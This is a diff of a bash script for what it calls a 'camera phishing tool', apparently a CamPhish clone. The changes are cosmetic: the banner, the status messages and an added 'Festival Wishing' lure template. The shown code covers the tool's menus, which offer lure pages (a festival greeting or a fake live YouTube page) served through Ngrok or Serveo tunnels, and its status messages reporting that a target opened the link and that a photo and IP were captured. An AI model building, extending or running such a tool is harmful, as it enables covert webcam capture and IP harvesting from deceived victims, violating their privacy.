@@ -3,15 +3,15 @@ trap 'printf "\n";stop' 2
 banner() {
 clear
 printf "\e[1;92m  _______  _______  _______  \e[0m\e[1;77m_______          _________ _______          \e[0m\n"
-printf "\e[1;92m (  ____ \(  ___  )(       )\e[0m\e[1;77m(  ____ )|\     /|\__   __/(  ____ \|\     /|\e[0m\n" 
-printf "\e[1;92m | (    \/| (   ) || () () |\e[0m\e[1;77m| (    )|| )   ( |   ) (   | (    \/| )   ( |\e[0m\n"   
-printf "\e[1;92m | |      | (___) || || || |\e[0m\e[1;77m| (____)|| (___) |   | |   | (_____ | (___) |\e[0m\n"   
-printf "\e[1;92m | |      |  ___  || |(_)| |\e[0m\e[1;77m|  _____)|  ___  |   | |   (_____  )|  ___  |\e[0m\n"    
-printf "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | |         ) || (   ) |\e[0m\n"    
-printf "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"   
+printf "\e[1;92m (  ____ \(  ___  )(       )\e[0m\e[1;77m(  ____ )|\     /|\__   __/(  ____ \|\     /|\e[0m\n"
+printf "\e[1;92m | (    \/| (   ) || () () |\e[0m\e[1;77m| (    )|| )   ( |   ) (   | (    \/| )   ( |\e[0m\n"
+printf "\e[1;92m | |      | (___) || || || |\e[0m\e[1;77m| (____)|| (___) |   | |   | (_____ | (___) |\e[0m\n"
+printf "\e[1;92m | |      |  ___  || |(_)| |\e[0m\e[1;77m|  _____)|  ___  |   | |   (_____  )|  ___  |\e[0m\n"
+printf "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | |         ) || (   ) |\e[0m\n"
+printf "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"
 printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n\n"
 
-printf " \e[1;77m CAMERA PHISHING CODE BY MOHAMMAD AIJAZ. \e[0m \n"
+printf " \e[1;77m CAMERA PHISHING TOOL CREATED BY MOHAMMAD AIJAZ \e[0m \n"
 
 printf "\n"
 
@@ -66,7 +66,7 @@ while [ true ]; do
 
 
 if [[ -e "ip.txt" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
+printf "\n\e[1;92m[\e[0m+\e[1;92m] TARGET HAS OPENED THE LINK-- !\n"
 catch_ip
 rm -rf ip.txt
 
@@ -75,7 +75,7 @@ fi
 sleep 0.5
 
 if [[ -e "Log.log" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
+printf "\n\e[1;92m[\e[0m+\e[1;92m] PHOTO IS RECIEVED--!\e[0m\n"
 rm -rf Log.log
 fi
 sleep 0.5
@@ -132,22 +132,25 @@ rm -rf index3.html
 
 select_template() {
 if [ $option_server -gt 2 ] || [ $option_server -lt 1 ]; then
-printf "\e[1;93m [!] Invalid tunnel option! TRY AGAIN\e[0m\n"
+printf "\e[1;93m [!] Invalid tunnel option! try again\e[0m\n"
 sleep 1
 clear
 banner
 camphish
 else
-printf "\n-----CHOOSE A TEMPLATE----\n"    
+printf "\n----- CHOOSE A TEMPLATE ----\n"    
 printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival Wishing\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Live Youtube TV\e[0m\n"
 default_option_template="1"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] CHOOSE A TEMPLATE: [Default is 1] \e[0m' option_tem
 option_tem="${option_tem:-${default_option_template}}"
 if [[ $option_tem -eq 1 ]]; then
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] FOR WEBSITE PRESS ANY KEY THEN PPRESS ENTER: \e[0m' fest_name
+fest_name="${fest_name//[[:space:]]/}"
+elif [[ $option_tem -eq 2 ]]; then
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] ENTER YOUTUBE VIDEO WATCH ID: \e[0m' yt_video_ID
 else
-printf "\e[1;93m [!] Invalid template option! TRY AGAIN\e[0m\n"
+printf "\e[1;93m [!] Invalid template option! try again\e[0m\n"
 sleep 1
 select_template
 fi
@@ -209,7 +212,7 @@ if [[ -e sendlink ]]; then
 rm -rf sendlink
 fi
 
-printf "\n-----Choose tunnel server----\n"    
+printf "\n----- CHOOSE A TUNNEL SERVER ----\n"    
 printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
 default_option_server="1"
